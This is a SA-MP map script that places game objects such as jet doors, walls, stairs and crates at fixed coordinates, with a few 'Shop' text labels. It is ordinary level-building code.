CreateObject(18981,108.23226,5888.825,112.12769,   0.00000, 0.00000, -179.39998);
CreateObject(18981,95.65885,5876.65019,112.09797,   0.00000, 0.00000, -90.18000);
CreateObject(18981,79.82545,5876.63774,112.08083,   0.00000, 0.00000, -90.18000);
CreateObject(18981,60.55717,5876.68193,112.02287,   0.00000, 0.00000, -90.18000);
CreateObject(18981,48.3663,5889.48198,112.37362,   0.00000, 0.00000, -179.39998);
CreateObject(18981,48.2988,5904.74834,112.36845,   0.00000, 0.00000, -179.39998);
CreateObject(18981,84.90104,5905.28032,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(18981,95.14876,5905.33525,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(18981,95.93546,5889.42974,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(18981,71.36293,5889.17998,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(18981,61.11616,5889.51714,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(2917,77.66098,5910.4832,78.91497,   0.00000, 0.00000, -179.40010);
CreateObject(2917,73.48059,5910.46636,78.91497,   0.00000, 0.00000, -179.40010);
CreateObject(2917,69.30037,5910.46855,78.91497,   0.00000, 0.00000, -179.40010);
CreateObject(2917,65.85664,5912.06572,78.91497,   0.00000, 0.00000, -227.94012);
CreateObject(18765,52.68316,5889.79351,79.26647,   0.00000, 0.00000, 0.00000);
CreateObject(18767,59.27182,5899.00249,76.59558,   0.00000, 0.00000, 0.00000);
CreateObject(2744,86.35734,5896.10967,77.92241,   0.00000, 0.00000, 0.00000);
CreateObject(1219,85.9442,5891.60137,76.28067,   0.00000, 0.00000, 0.00000);
CreateObject(1219,88.21445,5890.60186,76.28067,   0.00000, 0.00000, 0.00000);
CreateObject(19589,89.73487,5907.3521,76.27825,   0.00000, 0.00000, 0.00000);
CreateObject(19589,89.76272,5904.97002,76.27825,   0.96000, 28.08000, -87.12001);
CreateObject(852,98.26098,5881.76543,76.07923,   20.28000, -2.52000, 0.00000);
CreateObject(852,98.06917,5882.68511,76.07923,   0.00000, 0.00000, 0.00000);

CreateDynamic3DTextLabel("{5def4a} Shop", -1, -1059.4393, 2607.1452, 140.9962, 10.0);
CreateDynamic3DTextLabel("{5def4a} Shop", -1, -997.8439, 2452.3098, 130.9263, 10.0);
CreateDynamic3DTextLabel("{5def4a} Shop", -1, -1091.6904, 2408.2836, 126.8048, 10.0);
CreateDynamicObject(6232,-1061.11132812,2596.39062500,156.00428772,0.00000000,0.00000000,270.00000000); //object(canal_arch) (1)
CreateDynamicObject(3095,-1065.92871094,2611.13549805,139.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (2)
CreateDynamicObject(8656,-1063.82910156,2580.87792969,141.28720093,0.00000000,0.00000000,90.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8656,-1092.85302734,2580.29980469,135.78720093,338.05636597,4.31298828,91.61437988); //object(shbbyhswall09_lvs) (2)
CreateDynamicObject(3095,-1097.03222656,2576.43554688,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(17859,-1065.62365723,2568.01953125,137.18415833,0.00000000,0.00000000,0.00000000); //object(cinemark2_lae2) (1)
CreateDynamicObject(3095,-1088.85876465,2576.51489258,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1080.12866211,2576.52612305,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1071.35571289,2576.42114258,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1061.20361328,2576.44360352,136.85282898,270.00000000,180.00000000,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1061.20239258,2576.37768555,144.85282898,270.00000000,179.99450684,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1063.55346680,2576.41625977,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1066.16137695,2580.93652344,136.85282898,270.00000000,179.99450684,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1073.77038574,2580.97387695,136.85282898,270.00000000,179.99450684,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1081.10620117,2580.72924805,135.10282898,292.00000000,90.00000000,272.00543213); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1087.20458984,2580.52050781,132.85282898,291.99462891,90.00000000,272.00500488); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1101.86206055,2576.46484375,134.60282898,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(17859,-1088.52954102,2567.96923828,137.18415833,0.00000000,0.00000000,0.00000000); //object(cinemark2_lae2) (2)
CreateDynamicObject(3095,-1090.61169434,2571.44165039,136.85282898,270.00000000,179.99450684,182.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1092.64721680,2555.67089844,135.10282898,270.00000000,179.99450684,359.99951172); //object(a51_jetdoor) (7)
CreateDynamicObject(6959,-1097.58032227,2600.05175781,132.53628540,0.00000000,338.00000000,0.00000000); //object(vegasnbball1) (2)
CreateDynamicObject(6959,-1111.05334473,2599.45581055,135.03628540,0.00000000,0.00000000,0.00000000); //object(vegasnbball1) (3)
CreateDynamicObject(6959,-1126.86962891,2559.96386719,135.03628540,0.00000000,0.00000000,0.00000000); //object(vegasnbball1) (4)
CreateDynamicObject(2988,-1131.63671875,2548.66601562,135.00503540,0.00000000,0.00000000,265.99548340); //object(comp_wood_gate) (1)
CreateDynamicObject(17859,-1140.15649414,2535.91772461,137.18415833,0.00000000,0.00000000,180.00000000); //object(cinemark2_lae2) (4)
CreateDynamicObject(2988,-1138.43310547,2549.26196289,135.00503540,0.00000000,0.00000000,147.99548340); //object(comp_wood_gate) (2)
CreateDynamicObject(8057,-1083.24316406,2616.52929688,143.19783020,0.00000000,90.00000000,268.00018311); //object(hseing01_lvs) (1)
CreateDynamicObject(8057,-1136.02795410,2618.40942383,143.19783020,0.00000000,90.00000000,267.99499512); //object(hseing01_lvs) (2)
CreateDynamicObject(8057,-1134.41162109,2608.10058594,143.19783020,0.00000000,90.00000000,359.99475098); //object(hseing01_lvs) (3)
CreateDynamicObject(8057,-1159.22912598,2582.78100586,143.19783020,0.00000000,90.00000000,269.99450684); //object(hseing01_lvs) (4)
CreateDynamicObject(2988,-1131.20483398,2602.33422852,135.00503540,0.00000000,0.00000000,175.99133301); //object(comp_wood_gate) (3)
CreateDynamicObject(17859,-1135.27307129,2598.52465820,137.18415833,0.00000000,0.00000000,270.00000000); //object(cinemark2_lae2) (5)
CreateDynamicObject(2988,-1131.20410156,2602.33398438,135.00503540,0.00000000,0.00000000,5.98999023); //object(comp_wood_gate) (4)
CreateDynamicObject(3630,-1128.48974609,2579.97802734,138.74765015,0.00000000,90.00000000,90.00000000); //object(crdboxes2_las) (1)
CreateDynamicObject(3630,-1128.48925781,2579.97753906,138.74765015,0.00000000,90.00000000,0.00000000); //object(crdboxes2_las) (2)
CreateDynamicObject(8057,-1150.33508301,2576.57202148,143.19783020,0.00000000,90.00000000,359.98901367); //object(hseing01_lvs) (5)
CreateDynamicObject(8656,-1162.33496094,2541.69409180,136.03720093,0.00000000,0.00000000,0.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1063.75183105,2606.03637695,140.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (1)
CreateDynamicObject(12814,-1092.45959473,2605.64550781,134.75503540,0.00000000,338.00000000,0.00000000); //object(cuntyeland04) (3)
CreateDynamicObject(12814,-1106.97570801,2604.79809570,135.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (4)
CreateDynamicObject(12814,-1136.71472168,2604.66210938,135.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (5)
CreateDynamicObject(12814,-1121.11157227,2554.76391602,135.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (6)
CreateDynamicObject(12814,-1147.93579102,2554.78100586,135.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (7)
CreateDynamicObject(12814,-1081.44433594,2565.25244141,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (8)
CreateDynamicObject(12814,-1136.98352051,2515.01782227,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (9)
CreateDynamicObject(8057,-1119.37109375,2511.33398438,143.19783020,0.00000000,90.00000000,179.98883057); //object(hseing01_lvs) (6)
CreateDynamicObject(8057,-1134.36657715,2497.09960938,143.19783020,0.00000000,90.00000000,89.98297119); //object(hseing01_lvs) (7)
CreateDynamicObject(12814,-1186.03161621,2515.23803711,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (10)
CreateDynamicObject(12814,-1188.33557129,2544.14794922,131.25503540,0.00000000,16.00000000,90.00000000); //object(cuntyeland04) (11)
CreateDynamicObject(12814,-1162.94738770,2552.42114258,120.54502869,0.00000000,90.00000000,180.00012207); //object(cuntyeland04) (12)
CreateDynamicObject(8057,-1159.17541504,2578.03417969,143.19783020,0.00000000,90.00000000,179.98352051); //object(hseing01_lvs) (8)
CreateDynamicObject(8057,-1154.37341309,2577.96093750,143.19783020,0.00000000,90.00000000,179.98352051); //object(hseing01_lvs) (9)
CreateDynamicObject(12814,-1188.04553223,2569.14062500,127.50503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (13)
CreateDynamicObject(6232,-1177.87365723,2550.66625977,141.00428772,0.00000000,0.00000000,0.00000000); //object(canal_arch) (1)
CreateDynamicObject(8057,-1190.23449707,2573.97094727,143.19783020,0.00000000,90.00000000,269.98901367); //object(hseing01_lvs) (10)
CreateDynamicObject(8656,-1190.11035156,2540.46875000,136.03720093,0.00000000,0.00000000,0.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1189.61560059,2531.70190430,120.29502869,0.00000000,90.00000000,359.99975586); //object(cuntyeland04) (14)
CreateDynamicObject(8057,-1221.02478027,2553.12133789,143.19783020,0.00000000,90.00000000,269.98901367); //object(hseing01_lvs) (11)
CreateDynamicObject(14416,-990.95007324,2521.71728516,125.95789337,6.00000000,0.00000000,179.50000000); //object(carter-stairs07) (1)
CreateDynamicObject(8656,-1190.04589844,2506.10205078,136.03720093,0.00000000,0.00000000,0.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1205.15405273,2525.84521484,136.83500671,0.00000000,0.00000000,180.00000000); //object(cuntyeland04) (15)
CreateDynamicObject(8057,-1192.70556641,2484.09033203,143.19783020,0.00000000,90.00000000,359.98901367); //object(hseing01_lvs) (12)
CreateDynamicObject(8057,-1217.40881348,2508.99975586,143.19783020,0.00000000,90.00000000,89.98339844); //object(hseing01_lvs) (13)
CreateDynamicObject(8057,-1207.25976562,2537.65258789,143.19783020,0.00000000,90.00000000,359.97802734); //object(hseing01_lvs) (14)
CreateDynamicObject(12814,-1175.94653320,2475.82690430,135.25503540,0.00000000,0.00000000,180.00000000); //object(cuntyeland04) (16)
CreateDynamicObject(8057,-1158.08337402,2465.69873047,143.19783020,0.00000000,90.00000000,181.97802734); //object(hseing01_lvs) (15)
CreateDynamicObject(12814,-1175.43908691,2426.24487305,135.25503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (17)
CreateDynamicObject(8057,-1217.23645020,2454.24291992,143.19783020,0.00000000,90.00000000,269.98352051); //object(hseing01_lvs) (16)
CreateDynamicObject(8057,-1206.15039062,2426.55224609,143.19783020,0.00000000,90.00000000,359.97784424); //object(hseing01_lvs) (17)
CreateDynamicObject(12814,-1204.66162109,2430.01611328,135.25503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (18)
CreateDynamicObject(8057,-1218.40551758,2406.92480469,143.19783020,0.00000000,90.00000000,91.97232056); //object(hseing01_lvs) (18)
CreateDynamicObject(8057,-1193.56542969,2382.74487305,143.19783020,0.00000000,90.00000000,359.97174072); //object(hseing01_lvs) (19)
CreateDynamicObject(12814,-1175.09753418,2406.19775391,136.75503540,22.00000000,0.00000000,179.99450684); //object(cuntyeland04) (19)
CreateDynamicObject(12814,-1174.96435547,2358.67138672,145.88510132,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (20)
CreateDynamicObject(8057,-1163.02343750,2353.64184570,143.19783020,0.00000000,90.00000000,89.96704102); //object(hseing01_lvs) (20)
CreateDynamicObject(8057,-1134.36254883,2356.96142578,143.19783020,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (21)
CreateDynamicObject(8057,-1107.79931641,2381.10791016,143.19783020,0.00000000,90.00000000,87.96105957); //object(hseing01_lvs) (22)
CreateDynamicObject(12814,-1146.68823242,2358.20043945,145.88510132,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (21)
CreateDynamicObject(8656,-1159.97814941,2393.15136719,146.74722290,0.00000000,0.00000000,0.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1160.14233398,2383.53857422,130.82504272,0.00000000,90.00000000,180.00000000); //object(cuntyeland04) (22)
CreateDynamicObject(12814,-1135.30554199,2407.42089844,130.82504272,0.00000000,90.00000000,87.99957275); //object(cuntyeland04) (23)
CreateDynamicObject(12814,-1145.72082520,2431.86938477,135.25503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (24)
CreateDynamicObject(8057,-1131.82482910,2438.50683594,143.19783020,0.00000000,90.00000000,265.97711182); //object(hseing01_lvs) (23)
CreateDynamicObject(12814,-1116.93225098,2430.59716797,130.25503540,0.00000000,340.00000000,179.99450684); //object(cuntyeland04) (25)
CreateDynamicObject(12814,-1091.32690430,2408.67431641,126.00503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (26)
CreateDynamicObject(6232,-1106.13854980,2420.16821289,141.04473877,0.00000000,0.00000000,268.00000000); //object(canal_arch) (1)
CreateDynamicObject(8656,-1144.14819336,2406.87182617,146.74722290,0.00000000,0.00000000,88.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8656,-1133.88696289,2406.59130859,146.74722290,0.00000000,0.00000000,87.99499512); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(6232,-1063.59082031,2451.26855469,135.27336121,0.00000000,0.00000000,1.99597168); //object(canal_arch) (1)
CreateDynamicObject(12814,-1025.93713379,2411.41723633,131.50503540,14.00000000,0.00000000,269.99450684); //object(cuntyeland04) (27)
CreateDynamicObject(12814,-1061.87609863,2409.11938477,126.00503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (30)
CreateDynamicObject(12814,-1081.29406738,2535.98168945,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (31)
CreateDynamicObject(12814,-1107.23449707,2539.25585938,135.25503540,270.00000000,180.00000000,180.00000000); //object(cuntyeland04) (34)
CreateDynamicObject(8057,-1095.70910645,2511.27368164,143.19783020,0.00000000,90.00000000,359.98315430); //object(hseing01_lvs) (26)
CreateDynamicObject(8656,-1080.40246582,2508.30664062,135.99722290,0.00000000,0.00000000,179.99499512); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1104.95776367,2506.71215820,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (35)
CreateDynamicObject(8656,-1080.42724609,2480.21630859,135.99722290,0.00000000,0.00000000,179.99450684); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1105.54772949,2485.33618164,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (36)
CreateDynamicObject(12814,-1134.39965820,2391.94848633,145.70510864,0.00000000,0.00000000,267.99450684); //object(cuntyeland04) (37)
CreateDynamicObject(12814,-1084.47875977,2389.75659180,145.70510864,0.00000000,0.00000000,267.98950195); //object(cuntyeland04) (40)
CreateDynamicObject(3095,-1093.37072754,2409.26440430,145.14431763,0.00000000,0.00000000,358.00000000); //object(a51_jetdoor) (24)
CreateDynamicObject(3095,-1102.10424805,2409.26782227,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (25)
CreateDynamicObject(3095,-1093.61315918,2418.05566406,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (29)
CreateDynamicObject(3095,-1101.81457520,2418.19018555,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (30)
CreateDynamicObject(3095,-1101.57653809,2426.89746094,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (31)
CreateDynamicObject(3095,-1092.83044434,2426.65820312,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (32)
CreateDynamicObject(3095,-1100.93554688,2435.72558594,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (34)
CreateDynamicObject(3095,-1092.08581543,2435.22314453,145.14431763,0.00000000,0.00000000,357.99499512); //object(a51_jetdoor) (35)
CreateDynamicObject(3095,-1085.27453613,2470.19091797,138.89431763,270.00000000,180.00000000,179.99499512); //object(a51_jetdoor) (37)
CreateDynamicObject(12814,-1092.90332031,2455.55468750,135.98904419,270.00000000,179.99450684,267.98950195); //object(cuntyeland04) (41)
CreateDynamicObject(8057,-1091.10437012,2411.88647461,162.94783020,0.00000000,90.00000000,177.97351074); //object(hseing01_lvs) (27)
CreateDynamicObject(8057,-1106.12792969,2464.16015625,143.19783020,0.00000000,90.00000000,357.97338867); //object(hseing01_lvs) (29)
CreateDynamicObject(14414,-1095.03186035,2445.49560547,142.50247192,0.00000000,0.00000000,358.00000000); //object(carter-stairs05) (1)
CreateDynamicObject(14414,-1097.84460449,2445.59521484,142.50247192,0.00000000,0.00000000,357.99499512); //object(carter-stairs05) (2)
CreateDynamicObject(3095,-1088.06933594,2470.15112305,138.89431763,270.00000000,179.99450684,179.99450684); //object(a51_jetdoor) (39)
CreateDynamicObject(3095,-1088.06933594,2470.15039062,147.64431763,270.00000000,179.99450684,179.99450684); //object(a51_jetdoor) (40)
CreateDynamicObject(3095,-1085.27441406,2470.19042969,147.39431763,270.00000000,179.99450684,179.99450684); //object(a51_jetdoor) (43)
CreateDynamicObject(12814,-1116.77502441,2461.28491211,135.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (44)
CreateDynamicObject(12814,-1115.33691406,2464.64257812,136.75503540,0.00000000,14.00000000,90.00000000); //object(cuntyeland04) (46)
CreateDynamicObject(14414,-1101.83593750,2445.84863281,142.50247192,0.00000000,0.00000000,357.99499512); //object(carter-stairs05) (3)
CreateDynamicObject(3095,-1092.85546875,2439.21044922,147.64431763,270.00000000,180.00000000,268.00030518); //object(a51_jetdoor) (45)
CreateDynamicObject(3095,-1092.85546875,2439.20996094,156.14431763,270.00000000,179.99450684,267.99499512); //object(a51_jetdoor) (46)
CreateDynamicObject(8057,-1120.50329590,2484.51220703,143.19783020,0.00000000,90.00000000,273.97781372); //object(hseing01_lvs) (30)
CreateDynamicObject(12814,-1131.08691406,2407.08544922,130.82504272,0.00000000,90.00000000,87.99499512); //object(cuntyeland04) (47)
CreateDynamicObject(8656,-1122.48022461,2406.24316406,146.74722290,0.00000000,0.00000000,87.99499512); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-1065.41430664,2497.16430664,129.25503540,14.00000000,0.00000000,0.00000000); //object(cuntyeland04) (49)
CreateDynamicObject(8057,-1083.10766602,2493.41308594,117.89777374,0.00000000,90.00000000,359.97802734); //object(hseing01_lvs) (31)
CreateDynamicObject(8057,-1089.57397461,2412.35864258,162.94783020,0.00000000,90.00000000,357.97253418); //object(hseing01_lvs) (32)
CreateDynamicObject(8057,-1081.47216797,2464.09155273,117.87768555,0.00000000,90.00000000,1.96752930); //object(hseing01_lvs) (33)
CreateDynamicObject(8057,-1104.55334473,2436.60742188,118.12768555,0.00000000,90.00000000,269.96618652); //object(hseing01_lvs) (34)
CreateDynamicObject(12814,-1063.33117676,2458.18237305,126.00503540,0.00000000,0.00000000,179.99450684); //object(cuntyeland04) (50)
CreateDynamicObject(17859,-1047.79760742,2482.45922852,128.15412903,0.00000000,0.00000000,90.00000000); //object(cinemark2_lae2) (6)
CreateDynamicObject(6959,-1030.43591309,2483.11035156,115.60894775,90.00000000,179.59649658,180.40350342); //object(vegasnbball1) (8)
CreateDynamicObject(6959,-1014.52813721,2469.42553711,126.03028107,0.00000000,0.00000000,0.00000000); //object(vegasnbball1) (9)
CreateDynamicObject(6959,-1016.20324707,2473.64648438,115.60894775,90.00000000,180.40649414,359.58801270); //object(vegasnbball1) (10)
CreateDynamicObject(14395,-1006.81402588,2485.91772461,127.71492004,0.00000000,0.00000000,0.00000000); //object(dr_gsnew11) (1)
CreateDynamicObject(6959,-1009.82244873,2503.61303711,115.60894775,90.00000000,180.40649414,269.58789062); //object(vegasnbball1) (11)
CreateDynamicObject(6959,-1017.53814697,2489.82812500,115.60894775,90.00000000,180.40649414,177.58245850); //object(vegasnbball1) (13)
CreateDynamicObject(17859,-997.13287354,2493.56933594,132.15412903,0.00000000,0.00000000,178.00000000); //object(cinemark2_lae2) (7)
CreateDynamicObject(6959,-983.24200439,2472.94140625,129.85531616,0.00000000,0.00000000,0.00000000); //object(vegasnbball1) (14)
CreateDynamicObject(17859,-977.72894287,2460.43969727,131.90412903,0.00000000,0.00000000,178.74499512); //object(cinemark2_lae2) (8)
CreateDynamicObject(3095,-1002.25036621,2481.58422852,129.29919434,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (47)
CreateDynamicObject(3095,-1002.27606201,2485.62377930,125.29919434,270.00000000,180.01416016,180.01416016); //object(a51_jetdoor) (48)
CreateDynamicObject(3095,-1006.21185303,2481.52441406,125.29920959,270.00000000,180.01098633,270.01098633); //object(a51_jetdoor) (50)
CreateDynamicObject(3095,-1006.23327637,2475.74340820,125.29920959,270.00000000,180.01098633,270.01098633); //object(a51_jetdoor) (51)
CreateDynamicObject(3095,-1002.24572754,2474.11840820,129.29919434,0.00000000,0.00000000,0.00000000); //object(a51_jetdoor) (52)
CreateDynamicObject(3095,-1002.25000000,2481.58398438,131.04919434,270.00000000,180.04394531,180.04394531); //object(a51_jetdoor) (53)
CreateDynamicObject(3095,-1010.05755615,2481.57958984,134.32412720,270.00000000,180.04394531,180.04394531); //object(a51_jetdoor) (54)
CreateDynamicObject(3095,-1014.56365967,2486.18774414,134.32412720,270.00000000,180.04394531,90.04394531); //object(a51_jetdoor) (55)
CreateDynamicObject(3095,-1006.23242188,2475.74316406,134.04920959,270.00000000,180.01098633,270.01098633); //object(a51_jetdoor) (56)
CreateDynamicObject(3095,-1006.20617676,2477.61767578,134.04920959,270.00000000,180.01098633,270.01098633); //object(a51_jetdoor) (57)
CreateDynamicObject(3095,-998.24041748,2477.62182617,131.04919434,270.00000000,180.04394531,90.04394531); //object(a51_jetdoor) (58)
CreateDynamicObject(6959,-996.19982910,2473.68017578,119.10894775,90.00000000,180.40649414,359.58801270); //object(vegasnbball1) (16)
CreateDynamicObject(6959,-950.82269287,2473.36035156,119.10894775,90.00000000,180.40649414,359.58801270); //object(vegasnbball1) (17)
CreateDynamicObject(6959,-965.61163330,2482.25488281,119.10894775,90.00000000,180.40649414,89.58801270); //object(vegasnbball1) (18)
CreateDynamicObject(6959,-964.99102783,2488.13354492,119.10894775,90.00000000,180.40649414,177.58251953); //object(vegasnbball1) (19)
CreateDynamicObject(3095,-1002.25000000,2481.58398438,134.29919434,270.00000000,180.04394531,180.04394531); //object(a51_jetdoor) (59)
CreateDynamicObject(6959,-984.95068359,2476.58251953,135.39529419,0.00000000,180.00000000,178.00000000); //object(vegasnbball1) (21)
CreateDynamicObject(6959,-1015.73846436,2477.55834961,135.39529419,0.00000000,179.99450684,177.99499512); //object(vegasnbball1) (22)
CreateDynamicObject(8057,-1051.88806152,2511.35522461,130.13777161,0.00000000,90.00000000,179.97802734); //object(hseing01_lvs) (35)
CreateDynamicObject(8057,-1046.84643555,2553.48022461,130.13777161,0.00000000,90.00000000,179.96691895); //object(hseing01_lvs) (38)
CreateDynamicObject(12814,-1041.65026855,2545.54296875,135.25503540,0.00000000,0.00000000,180.00000000); //object(cuntyeland04) (51)
CreateDynamicObject(3630,-1057.54565430,2538.86743164,136.75546265,0.00000000,90.00000000,0.00000000); //object(crdboxes2_las) (3)
CreateDynamicObject(3630,-1091.75244141,2472.51782227,139.00546265,0.00000000,90.00000000,0.00000000); //object(crdboxes2_las) (4)
CreateDynamicObject(3630,-1091.75195312,2472.51757812,139.00546265,0.00000000,90.00000000,263.99963379); //object(crdboxes2_las) (5)
CreateDynamicObject(3630,-1099.50610352,2480.35278320,139.00546265,0.00000000,90.00000000,263.99597168); //object(crdboxes2_las) (6)
CreateDynamicObject(3630,-1057.54492188,2538.86718750,136.75546265,0.00000000,90.00000000,171.99963379); //object(crdboxes2_las) (7)
CreateDynamicObject(8057,-1014.08410645,2616.13671875,146.82859802,0.00000000,90.00000000,271.97253418); //object(hseing01_lvs) (40)
CreateDynamicObject(8057,-960.72100830,2618.09985352,146.82859802,0.00000000,90.00000000,271.97204590); //object(hseing01_lvs) (41)
CreateDynamicObject(12814,-1034.51708984,2599.71972656,140.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (52)
CreateDynamicObject(12814,-1005.18682861,2599.85180664,140.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (53)
CreateDynamicObject(12814,-1014.82348633,2561.09863281,140.25503540,0.00000000,0.00000000,90.00000000); //object(cuntyeland04) (54)
CreateDynamicObject(8656,-990.10424805,2559.87939453,140.93728638,0.00000000,0.00000000,180.00000000); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8057,-1008.92480469,2526.89892578,130.13777161,0.00000000,90.00000000,359.97229004); //object(hseing01_lvs) (42)
CreateDynamicObject(8057,-1033.65246582,2558.08154297,130.13777161,0.00000000,90.00000000,87.96676636); //object(hseing01_lvs) (43)
CreateDynamicObject(8656,-1005.05926514,2546.63793945,139.63735962,0.00000000,0.00000000,89.99450684); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8057,-1038.69885254,2556.30541992,130.13777161,0.00000000,90.00000000,359.96179199); //object(hseing01_lvs) (44)
CreateDynamicObject(3630,-1031.94970703,2583.15820312,141.75546265,0.00000000,90.00000000,90.00000000); //object(crdboxes2_las) (8)
CreateDynamicObject(3630,-1031.11047363,2574.83349609,141.75546265,0.00000000,90.00000000,90.00000000); //object(crdboxes2_las) (9)
CreateDynamicObject(3630,-1031.11035156,2574.83300781,141.75546265,0.00000000,90.00000000,359.99975586); //object(crdboxes2_las) (10)
CreateDynamicObject(3630,-1031.94921875,2583.15820312,141.75546265,0.00000000,90.00000000,359.99987793); //object(crdboxes2_las) (11)
CreateDynamicObject(12814,-975.47839355,2599.96191406,140.25503540,0.00000000,0.00000000,0.00000000); //object(cuntyeland04) (55)
CreateDynamicObject(12814,-982.43273926,2520.69970703,127.32510376,0.00000000,0.00000000,88.00000000); //object(cuntyeland04) (58)
CreateDynamicObject(12814,-975.55377197,2551.95922852,131.00503540,21.99658203,0.00000000,0.00000000); //object(cuntyeland04) (59)
CreateDynamicObject(8656,-973.94775391,2518.89965820,128.28732300,0.00000000,0.00000000,87.99450684); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(14416,-1188.20263672,2523.43847656,133.76284790,0.00000000,0.00000000,90.00000000); //object(carter-stairs07) (2)
CreateDynamicObject(8656,-1008.02154541,2519.93041992,128.28732300,0.00000000,0.00000000,87.98950195); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-982.16180420,2503.62280273,129.42514038,0.00000000,0.00000000,87.99499512); //object(cuntyeland04) (60)
CreateDynamicObject(8057,-1017.90325928,2547.46118164,122.37281799,0.00000000,90.00000000,269.96667480); //object(hseing01_lvs) (45)
CreateDynamicObject(12814,-982.18725586,2550.31640625,127.32510376,0.00000000,0.00000000,87.99499512); //object(cuntyeland04) (61)
CreateDynamicObject(8057,-992.87628174,2572.48925781,122.64777374,0.00000000,90.00000000,359.96142578); //object(hseing01_lvs) (46)
CreateDynamicObject(8057,-966.38934326,2551.10693359,146.63777161,0.00000000,90.00000000,179.96661377); //object(hseing01_lvs) (47)
CreateDynamicObject(8057,-966.47155762,2588.36181641,146.68788147,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (49)
CreateDynamicObject(8057,-966.38867188,2551.10644531,112.54267120,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (51)
CreateDynamicObject(8057,-966.44903564,2496.75122070,146.63777161,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (52)
CreateDynamicObject(8057,-966.44824219,2496.75097656,112.03287506,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (53)
CreateDynamicObject(8057,-951.47729492,2503.20288086,146.63777161,0.00000000,90.00000000,89.96127319); //object(hseing01_lvs) (54)
CreateDynamicObject(12814,-989.37487793,2505.76782227,149.32313538,0.00000000,90.00000000,87.99450684); //object(cuntyeland04) (62)
CreateDynamicObject(8057,-1008.92480469,2526.89843750,147.23744202,0.00000000,90.00000000,359.96704102); //object(hseing01_lvs) (56)
CreateDynamicObject(8057,-1033.65234375,2558.08105469,147.11265564,0.00000000,90.00000000,87.96203613); //object(hseing01_lvs) (57)
CreateDynamicObject(8057,-1038.69824219,2556.30468750,147.14335632,0.00000000,90.00000000,359.96154785); //object(hseing01_lvs) (58)
CreateDynamicObject(8057,-1050.73974609,2370.80444336,136.54769897,0.00000000,90.00000000,359.96130371); //object(hseing01_lvs) (60)
CreateDynamicObject(8057,-1050.73925781,2370.80371094,136.54769897,0.00000000,90.00000000,179.95568848); //object(hseing01_lvs) (61)
